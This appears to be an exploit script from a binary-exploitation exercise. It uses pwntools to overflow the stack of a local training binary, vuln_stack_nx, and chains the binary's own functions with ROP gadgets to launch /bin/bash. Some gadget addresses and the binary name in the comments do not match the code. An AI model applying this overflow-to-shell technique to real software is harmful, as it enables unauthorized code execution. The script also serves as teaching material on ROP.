#!/usr/bin/python3
# coding: utf-8


# ROP test for the executable vuln1_stack.
#  Chains the functions add_bin, add_bash, and exec_string:
#  add_bin:      0x80493af  (parameters 0xdeadbeef)
#  add_bash:     0x80493fc (parameters: 0xcafebabe, 0x0badf00d)
#  exec_string:  0x8049373
#
#  To find gadgets to chain:
#      ~/rop-tool/rop-tool gadget vuln_stack_nx
#  Found a gadget: 0x080494bd: add esp, 0xc; pop ebx; pop esi; pop edi; pop ebp; ret;
#   To find the addresses: (gdb) x/8i 0x080494bd
#   pop ret: 0x080494c3
#   pop pop ret: 0x080494c2
#
# To test: first run sh to see that /bin/bash starts afterwards.
# Then run: ./rop.py
	
from pwn import * 

# addresses definition 

add_bin = 	0x80493af
add_bash = 	0x80493fc
exec_string = 	0x8049373
pop_ret = 	0x0804901e
pop_pop_ret = 	0x080493f9


p = b''
p += b'A' * 500
p += b'B' * 16
p += p32(add_bin)
p += p32(pop_ret)
p += p32(0xdeadbeef)
p += p32(add_bash)
p += p32(pop_pop_ret)
p += p32(0xcafebabe)
p += p32(0x0badf00d)
p += p32(exec_string)

proc = process(['./vuln_stack_nx', p])
proc.interactive()



